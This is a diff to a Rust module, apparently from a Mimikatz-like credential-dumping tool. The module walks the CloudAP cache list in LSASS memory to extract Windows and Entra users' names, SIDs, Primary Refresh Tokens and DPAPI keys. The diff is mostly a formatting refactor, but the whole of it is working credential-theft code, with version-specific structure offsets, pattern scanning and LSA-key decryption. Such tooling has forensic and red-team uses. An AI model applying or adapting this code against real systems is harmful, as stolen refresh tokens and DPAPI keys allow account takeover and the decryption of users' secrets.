@@ -1,7 +1,9 @@
 use crate::error::Result;
 use crate::lsass::crypto::CryptoKeys;
 use crate::lsass::patterns;
-use crate::lsass::types::{Arch, CloudApCredential, read_ptr, is_valid_user_ptr, walk_list, scan_data_for_list_head};
+use crate::lsass::types::{
+    Arch, CloudApCredential, is_valid_user_ptr, read_ptr, scan_data_for_list_head, walk_list,
+};
 use crate::memory::VirtualMemory;
 use crate::pe::parser::PeHeaders;
 
@@ -12,14 +14,29 @@ struct CloudApLogonOffsets {
 }
 
 const CLOUDAP_LOGON_VARIANTS: &[CloudApLogonOffsets] = &[
-    CloudApLogonOffsets { luid: 0x18, cache_entry: 0x30 }, // Win10 1903+
-    CloudApLogonOffsets { luid: 0x1C, cache_entry: 0x38 }, // Win11
-    CloudApLogonOffsets { luid: 0x14, cache_entry: 0x28 }, // Win10 1507
+    CloudApLogonOffsets {
+        luid: 0x18,
+        cache_entry: 0x30,
+    }, // Win10 1903+
+    CloudApLogonOffsets {
+        luid: 0x1C,
+        cache_entry: 0x38,
+    }, // Win11
+    CloudApLogonOffsets {
+        luid: 0x14,
+        cache_entry: 0x28,
+    }, // Win10 1507
 ];
 
 const CLOUDAP_LOGON_VARIANTS_X86: &[CloudApLogonOffsets] = &[
-    CloudApLogonOffsets { luid: 0x10, cache_entry: 0x20 }, // Win10 x86 1903+
-    CloudApLogonOffsets { luid: 0x0C, cache_entry: 0x18 }, // Win10 x86 1507
+    CloudApLogonOffsets {
+        luid: 0x10,
+        cache_entry: 0x20,
+    }, // Win10 x86 1903+
+    CloudApLogonOffsets {
+        luid: 0x0C,
+        cache_entry: 0x18,
+    }, // Win10 x86 1507
 ];
 
 /// KIWI_CLOUDAP_CACHE_LIST_ENTRY per-arch offsets.
@@ -39,24 +56,36 @@ const CACHE_ENTRY_OFFSETS_X64_VARIANTS: &[CacheEntryOffsets] = &[
     // Win10 1803+ / Win11 (RTL_CRITICAL_SECTION layout)
     CacheEntryOffsets {
         toname_ptr: 0x58,
-        sid: 0xF0, to_determine: 0x108, cb_prt: 0x118, prt: 0x120,
+        sid: 0xF0,
+        to_determine: 0x108,
+        cb_prt: 0x118,
+        prt: 0x120,
     },
     // Win10 1703-1709 (RtlInitializeResource layout, hashName shifted +8)
     CacheEntryOffsets {
         toname_ptr: 0xC0,
-        sid: 0x158, to_determine: 0x170, cb_prt: 0x180, prt: 0x188,
+        sid: 0x158,
+        to_determine: 0x170,
+        cb_prt: 0x180,
+        prt: 0x188,
     },
     // Win10 1507-1607 (RtlInitializeResource layout, original)
     CacheEntryOffsets {
         toname_ptr: 0xC0,
-        sid: 0x150, to_determine: 0x168, cb_prt: 0x178, prt: 0x180,
+        sid: 0x150,
+        to_determine: 0x168,
+        cb_prt: 0x178,
+        prt: 0x180,
     },
 ];
 
 /// x86 cache entry offsets (4-byte pointers shrink all pointer fields):
 const CACHE_ENTRY_OFFSETS_X86: CacheEntryOffsets = CacheEntryOffsets {
     toname_ptr: 0x30,
-    sid: 0x90, to_determine: 0xA0, cb_prt: 0xAC, prt: 0xB0,
+    sid: 0x90,
+    to_determine: 0xA0,
+    cb_prt: 0xAC,
+    prt: 0xB0,
 };
 
 /// Extract CloudAP credentials from cloudap.dll (unified x64/x86).
@@ -77,59 +106,58 @@ pub fn extract_cloudap_credentials_arch(
     // x64: try .text pattern scan first, fall back to .data section scan
     // x86: no .text patterns available, go directly to .data scan
     let list_addr = match arch {
-        Arch::X64 => {
-            match pe.find_section(".text") {
-                Some(text) => {
-                    let text_base = dll_base + text.virtual_address as u64;
-                    match patterns::find_pattern(
-                        vmem,
-                        text_base,
-                        text.virtual_size,
-                        patterns::CLOUDAP_CACHE_PATTERNS,
-                        "CloudApCache",
-                    ) {
-                        Ok((pattern_addr, _)) => {
-                            patterns::find_list_via_lea(vmem, pattern_addr, "CloudAP cache list")?
-                        }
-                        Err(e) => {
-                            log::debug!(
-                                "CloudAP .text pattern scan failed ({}), trying .data fallback",
-                                e
-                            );
-                            find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?
-                        }
+        Arch::X64 => match pe.find_section(".text") {
+            Some(text) => {
+                let text_base = dll_base + u64::from(text.virtual_address);
+                match patterns::find_pattern(
+                    vmem,
+                    text_base,
+                    text.virtual_size,
+                    patterns::CLOUDAP_CACHE_PATTERNS,
+                    "CloudApCache",
+                ) {
+                    Ok((pattern_addr, _)) => {
+                        patterns::find_list_via_lea(vmem, pattern_addr, "CloudAP cache list")?
+                    }
+                    Err(e) => {
+                        log::debug!(
+                            "CloudAP .text pattern scan failed ({e}), trying .data fallback"
+                        );
+                        find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?
                     }
                 }
-                None => find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?,
             }
-        }
+            None => find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?,
+        },
         Arch::X86 => find_cloudap_cache_in_data(vmem, &pe, dll_base, arch)?,
     };
 
-    log::info!("CloudAP cache list at 0x{:x} (arch={:?})", list_addr, arch);
+    log::info!("CloudAP cache list at 0x{list_addr:x} (arch={arch:?})");
     walk_cloudap_cache(vmem, list_addr, keys, arch)
 }
 
 /// Auto-detect CloudAP logon entry variant by probing offsets on first entry.
-fn detect_logon_offsets(vmem: &dyn VirtualMemory, first_entry: u64, arch: Arch) -> &'static CloudApLogonOffsets {
+fn detect_logon_offsets(
+    vmem: &dyn VirtualMemory,
+    first_entry: u64,
+    arch: Arch,
+) -> &'static CloudApLogonOffsets {
     let variants = match arch {
         Arch::X64 => CLOUDAP_LOGON_VARIANTS,
         Arch::X86 => CLOUDAP_LOGON_VARIANTS_X86,
     };
     for variant in variants {
         // LUID should be a small nonzero value
-        let luid = match vmem.read_virt_u64(first_entry + variant.luid) {
-            Ok(l) => l,
-            Err(_) => continue,
+        let Ok(luid) = vmem.read_virt_u64(first_entry + variant.luid) else {
+            continue;
         };
         // LUID low part is typically < 0x100000 for user sessions
         if luid == 0 || luid > 0xFFFF_FFFF {
             continue;
         }
         // cacheEntry should be a valid heap pointer
-        let cache_ptr = match read_ptr(vmem, first_entry + variant.cache_entry, arch) {
-            Ok(p) => p,
-            Err(_) => continue,
+        let Ok(cache_ptr) = read_ptr(vmem, first_entry + variant.cache_entry, arch) else {
+            continue;
         };
         if is_valid_user_ptr(cache_ptr, arch) {
             return variant;
@@ -189,7 +217,11 @@ fn walk_cloudap_cache(
 
 /// Auto-detect the cache entry offset variant by probing toName_ptr.
 /// Returns the first variant where toName_ptr yields a valid user-mode pointer.
-fn detect_cache_entry_offsets(vmem: &dyn VirtualMemory, entry_addr: u64, arch: Arch) -> &'static CacheEntryOffsets {
+fn detect_cache_entry_offsets(
+    vmem: &dyn VirtualMemory,
+    entry_addr: u64,
+    arch: Arch,
+) -> &'static CacheEntryOffsets {
     let variants = match arch {
         Arch::X64 => CACHE_ENTRY_OFFSETS_X64_VARIANTS,
         Arch::X86 => std::slice::from_ref(&CACHE_ENTRY_OFFSETS_X86),
@@ -214,15 +246,14 @@ fn extract_cache_entry(
     let ce = detect_cache_entry_offsets(vmem, entry_addr, arch);
 
     // Read the account name from the toName pointer (UPN string).
-    let username = read_toname_ptr(vmem, entry_addr + ce.toname_ptr, arch)
-        .unwrap_or_default();
+    let username = read_toname_ptr(vmem, entry_addr + ce.toname_ptr, arch).unwrap_or_default();
 
     // Read the Sid pointer for domain info
     let sid_ptr = read_ptr(vmem, entry_addr + ce.sid, arch).unwrap_or(0);
     let domain = if is_valid_user_ptr(sid_ptr, arch) {
         let (sid_str, dom) = read_sid_string(vmem, sid_ptr);
         if !sid_str.is_empty() && username.is_empty() {
-            log::debug!("CloudAP: using SID {} as fallback", sid_str);
+            log::debug!("CloudAP: using SID {sid_str} as fallback");
         }
         dom
     } else {
@@ -265,7 +296,7 @@ fn read_toname_ptr(vmem: &dyn VirtualMemory, ptr_addr: u64, arch: Arch) -> Optio
     // Read up to 260 wchar_t (MAX_PATH equivalent for UPN)
     let raw = vmem.read_virt_bytes(name_ptr, 520).ok()?;
     let s = crate::utils::utf16le_decode(&raw);
-    if s.is_empty() || s.chars().any(|c| c.is_control()) {
+    if s.is_empty() || s.chars().any(char::is_control) {
         return None;
     }
     Some(s)
@@ -275,7 +306,12 @@ fn read_toname_ptr(vmem: &dyn VirtualMemory, ptr_addr: u64, arch: Arch) -> Optio
 const MAX_PRT_SIZE: u32 = 0x4000; // 16 KB
 
 /// Read PRT from cbPRT/PRT fields.
-fn read_prt(vmem: &dyn VirtualMemory, entry_addr: u64, ce: &CacheEntryOffsets, arch: Arch) -> String {
+fn read_prt(
+    vmem: &dyn VirtualMemory,
+    entry_addr: u64,
+    ce: &CacheEntryOffsets,
+    arch: Arch,
+) -> String {
     let cb_prt = match vmem.read_virt_u32(entry_addr + ce.cb_prt) {
         Ok(s) if s > 0 && s <= MAX_PRT_SIZE => s as usize,
         _ => return String::new(),
@@ -284,9 +320,8 @@ fn read_prt(vmem: &dyn VirtualMemory, entry_addr: u64, ce: &CacheEntryOffsets, a
         Ok(p) if is_valid_user_ptr(p, arch) => p,
         _ => return String::new(),
     };
-    let buf = match vmem.read_virt_bytes(prt_ptr, cb_prt) {
-        Ok(d) => d,
-        Err(_) => return String::new(),
+    let Ok(buf) = vmem.read_virt_bytes(prt_ptr, cb_prt) else {
+        return String::new();
     };
 
     // PRT is typically ASCII/UTF-8 JWT or hex-encoded
@@ -324,9 +359,8 @@ fn extract_dpapi_key_from_blob(
     };
 
     // Read the encrypted key data
-    let enc_data = match vmem.read_virt_bytes(blob_addr + 0x08, cb_key) {
-        Ok(d) => d,
-        Err(_) => return Vec::new(),
+    let Ok(enc_data) = vmem.read_virt_bytes(blob_addr + 0x08, cb_key) else {
+        return Vec::new();
     };
 
     // Try to decrypt using LSA keys
@@ -334,8 +368,7 @@ fn extract_dpapi_key_from_blob(
         Ok(d) if !d.is_empty() => d,
         _ => {
             log::debug!(
-                "CloudAP: DPAPI key decryption failed at 0x{:x}, storing encrypted blob",
-                blob_addr
+                "CloudAP: DPAPI key decryption failed at 0x{blob_addr:x}, storing encrypted blob"
             );
             enc_data
         }
@@ -344,14 +377,12 @@ fn extract_dpapi_key_from_blob(
 
 /// Try to read a SID from memory and convert to a user-friendly string.
 fn read_sid_string(vmem: &dyn VirtualMemory, sid_addr: u64) -> (String, String) {
-    let header = match vmem.read_virt_bytes(sid_addr, 8) {
-        Ok(d) => d,
-        Err(_) => return (String::new(), String::new()),
+    let Ok(header) = vmem.read_virt_bytes(sid_addr, 8) else {
+        return (String::new(), String::new());
     };
     let sub_count = header.get(1).copied().unwrap_or(0) as usize;
-    let sub_data = match vmem.read_virt_bytes(sid_addr + 8, sub_count * 4) {
-        Ok(d) => d,
-        Err(_) => return (String::new(), String::new()),
+    let Ok(sub_data) = vmem.read_virt_bytes(sid_addr + 8, sub_count * 4) else {
+        return (String::new(), String::new());
     };
     let sid_str = super::types::format_sid_from_bytes(&header, &sub_data);
     if sid_str.is_empty() {
@@ -374,33 +405,36 @@ fn find_cloudap_cache_in_data(
     };
 
     scan_data_for_list_head(
-        vmem, pe, dll_base, arch, 0x10000, "cloudap.dll", 0x100000,
-        true, "CloudAP cache list",
+        vmem,
+        pe,
+        dll_base,
+        arch,
+        0x10000,
+        "cloudap.dll",
+        0x100000,
+        true,
+        "CloudAP cache list",
         |flink, list_addr| {
-            let entry_flink = match read_ptr(vmem, flink, arch) {
-                Ok(f) => f,
-                Err(_) => return false,
+            let Ok(entry_flink) = read_ptr(vmem, flink, arch) else {
+                return false;
             };
             if entry_flink != list_addr && !is_valid_user_ptr(entry_flink, arch) {
                 return false;
             }
             // Try each variant to find a valid LUID + cacheEntry
             for variant in variants {
-                let luid = match vmem.read_virt_u64(flink + variant.luid) {
-                    Ok(l) => l,
-                    Err(_) => continue,
+                let Ok(luid) = vmem.read_virt_u64(flink + variant.luid) else {
+                    continue;
                 };
                 if luid == 0 || luid > 0xFFFFFFFF {
                     continue;
                 }
-                let cache_entry = match read_ptr(vmem, flink + variant.cache_entry, arch) {
-                    Ok(p) => p,
-                    Err(_) => continue,
+                let Ok(cache_entry) = read_ptr(vmem, flink + variant.cache_entry, arch) else {
+                    continue;
                 };
                 if is_valid_user_ptr(cache_entry, arch) {
                     log::debug!(
-                        "CloudAP: found cache list candidate at 0x{:x}: flink=0x{:x} LUID=0x{:x}",
-                        list_addr, flink, luid
+                        "CloudAP: found cache list candidate at 0x{list_addr:x}: flink=0x{flink:x} LUID=0x{luid:x}"
                     );
                     return true;
                 }
